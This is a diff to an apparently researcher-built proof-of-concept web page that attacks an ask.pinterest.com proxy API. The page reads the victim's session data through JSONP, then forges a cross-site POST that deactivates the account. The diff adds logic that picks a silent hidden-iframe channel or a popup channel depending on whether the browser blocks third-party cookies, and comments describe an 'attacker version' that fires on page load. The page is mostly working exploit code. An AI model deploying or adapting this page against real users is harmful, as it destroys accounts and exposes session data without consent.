@@ -97,7 +97,7 @@
 
   <div class="step">
     <h2><span class="n"></span>Fire the cross-site POST that deactivates the account (write side)</h2>
-    <p class="desc">An ordinary HTML form POSTs to the proxy endpoint, aimed at a hidden iframe. The browser attaches your Pinterest cookies automatically because they are <code>SameSite=None</code>. This is a CORS simple request: no preflight, no CSRF token, nothing for Pinterest's defenses to see. The proxy executes <code>v3_deactivate_user</code> with your session.</p>
+    <p class="desc">An ordinary HTML form POSTs to the proxy endpoint. The channel is chosen automatically from step 1: when the read succeeded, third-party cookies are attached in embedded contexts on this browser, so the POST goes to a hidden iframe and stays completely silent (no popup at all). When the read failed, this browser blocks third-party cookies, so the POST is fired as a top-level navigation instead, which is first-party to <code>ask.pinterest.com</code> and carries the <code>SameSite=None</code> cookie on every browser. Either way it is a CORS simple request: no preflight, no CSRF token, nothing for Pinterest's defenses to see. The proxy executes <code>v3_deactivate_user</code> with your session.</p>
     <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span> &nbsp;<span class="c">first_name=Stag</span></div>
     <p class="state wait" id="st2">waiting for the interlock&hellip;</p>
     <pre id="out2">The form submits into a hidden iframe. The response is cross-origin so this page cannot read it, but the next step proves what it did.</pre>
@@ -131,10 +131,15 @@
 </footer>
 </div>
 
-<!-- No hidden iframe: the POST must land in a TOP-LEVEL window (created by window.open or
-     automatically by the form's unknown target) so it is first-party to ask.pinterest.com
-     and carries the session cookie on every browser, including third-party-cookie blockers. -->
-<form id="csrf" method="POST" action="https://ask.pinterest.com/api/proxy/pinterest/users/me/" target="pwnd_top" style="display:none">
+<!-- Dual-channel write, selected automatically. The step-1 JSONP read doubles as a
+     third-party-cookie oracle: it is a cross-site subresource to ask.pinterest.com exactly
+     like a hidden-iframe POST, so if the session cookie rode that request it will also
+     ride the iframe POST (silent path, used when 3P cookies are enabled -> NO window.open).
+     If the read fails, the browser blocks third-party cookies in embedded contexts, and
+     the write is fired as a TOP-LEVEL navigation (window.open + form target=pwnd_top)
+     which is first-party to ask.pinterest.com and carries the cookie on every browser. -->
+<iframe name="pwnd" style="display:none" aria-hidden="true"></iframe>
+<form id="csrf" method="POST" action="https://ask.pinterest.com/api/proxy/pinterest/users/me/" style="display:none">
   <input type="hidden" name="first_name" value="Stag">
 </form>
 
@@ -143,7 +148,8 @@ document.getElementById('pgorigin').textContent = location.origin || 'null';
 
 var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
 var FIRED = false;
-var READ_OK = false;   // whether the JSONP read channel ever returned a session (step 1)
+var READ_OK = false;        // whether the JSONP read channel ever returned a session (step 1)
+var readState = 'pending';  // 'pending' | 'ok' | 'failed' -- doubles as the 3P-cookie oracle for channel selection
 
 function esc(s){var d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;}
 function setState(id, txt, cls){var e=document.getElementById(id);e.textContent=txt;e.className='state '+(cls||'wait');}
@@ -169,6 +175,7 @@ function loot(id, pairs){
 window.cbMe = function(d){
   var u = (d && d.data) || {};
   READ_OK = true;
+  readState = 'ok';
   setState('st1', '200 OK, victim confirmed logged in', 'ok');
   show('out1', d);
   loot('loot1', [
@@ -178,6 +185,7 @@ window.cbMe = function(d){
   ]);
 };
 window.readFail = function(reason){
+  readState = 'failed';
   fetch('https://ask.pinterest.com/api/health', {mode:'no-cors'})
     .then(function(){ setState('st1', 'read channel failed (' + reason + '). Network is reachable, so either you are not logged in to Pinterest in this browser, or this browser blocks third-party cookies (Safari/ITP, Firefox strict, Chrome 3p-block/incognito) so this foreign page cannot see your session. The write in step 2 does not depend on this read.', 'err'); })
     .catch(function(){ setState('st1', 'read channel failed (' + reason + ') AND ask.pinterest.com is not reachable from this device (DNS/proxy/firewall block).', 'err'); });
@@ -191,29 +199,55 @@ window.readFail = function(reason){
 })();
 
 // ---------- step 2: write side ----------
-// The POST goes to a TOP-LEVEL popup window (window.open + form target), not a hidden
-// iframe. A top-level navigation to ask.pinterest.com is a first-party request in that
-// window, so the SameSite=None session cookie is attached on EVERY browser, including
-// those that block third-party cookies in embedded contexts. The hidden-iframe variant
-// (kept as a fallback when popups are blocked) only works where third-party cookies are
-// allowed, which is exactly why the exploit silently failed on some devices.
-document.getElementById('arm').addEventListener('click', function(){
-  if (FIRED) return;
+// The write channel is selected automatically from the step-1 read oracle:
+//  - read OK     -> third-party cookies are attached in embedded contexts on this
+//                  browser, so the POST goes to the hidden iframe: completely
+//                  silent, NO window.open, nothing visible to the victim.
+//  - read failed -> this browser blocks third-party cookies in embedded contexts
+//                  (Safari ITP, Brave, Firefox strict, Chrome 3p-block), so the
+//                  POST is fired as a TOP-LEVEL navigation (window.open + form
+//                  target): first-party to ask.pinterest.com, cookie attached
+//                  on every browser.
+var readWaitStarted = 0;
+var fireQueued = false;
+function fireWrite(){
+  if (FIRED || fireQueued) return;
+  if (readState === 'pending') {
+    // the attacker version auto-fires on page load and must wait for the oracle
+    if (!readWaitStarted) readWaitStarted = Date.now();
+    if (Date.now() - readWaitStarted < 5000) {
+      setState('st2', 'waiting for the read oracle to select the write channel...', 'wait');
+      fireQueued = true;
+      setTimeout(function(){ fireQueued = false; fireWrite(); }, 150);
+      return;
+    }
+    readState = 'failed';   // oracle never resolved: use the always-safe channel
+  }
   FIRED = true;
   var btn = document.getElementById('arm');
   btn.disabled = true;
   document.getElementById('armstate').textContent = 'fired';
   document.getElementById('armstate').className = 'state err';
-  setState('st2', 'fired, cross-site POST sent with your cookies', 'err');
-  var w = window.open('', 'pwnd_top');   // top-level auxiliary window: cookies always sent
-  if (w) {
-    w.document.write('<body style="background:#0d1117;color:#8b949e;font:13px monospace;padding:16px">POST fired from ' + esc(location.origin) + ' - deactivating...</body>');
+  var form = document.getElementById('csrf');
+  if (readState === 'ok') {
+    // third-party cookies confirmed attached -> silent hidden-iframe POST (no popup)
+    form.target = 'pwnd';
+    setState('st2', 'fired via hidden iframe (third-party cookies detected as enabled) - silent cross-site POST sent with your cookies', 'err');
+  } else {
+    // read failed: third-party cookies blocked (or no visible session) -> top-level navigation
+    form.target = 'pwnd_top';
+    var w = window.open('', 'pwnd_top');   // top-level auxiliary window: cookies always sent
+    if (w) {
+      w.document.write('<body style="background:#0d1117;color:#8b949e;font:13px monospace;padding:16px">POST fired from ' + esc(location.origin) + ' - deactivating...</body>');
+    }
+    setState('st2', 'fired via top-level popup (third-party cookies detected as blocked) - first-party cross-site POST sent with your cookies', 'err');
   }
-  document.getElementById('csrf').submit();
-  // attacker version, no interlock:
-  // document.getElementById('csrf').submit();   // on page load
+  form.submit();
   setTimeout(function(){ scheduleDeadChecks(); }, 4000);
-});
+}
+document.getElementById('arm').addEventListener('click', fireWrite);
+// attacker version, no interlock:
+// fireWrite();   // on page load (waits for the read oracle, then fires on the right channel)
 
 // ---------- step 3: verify dead ----------
 var checked = false;
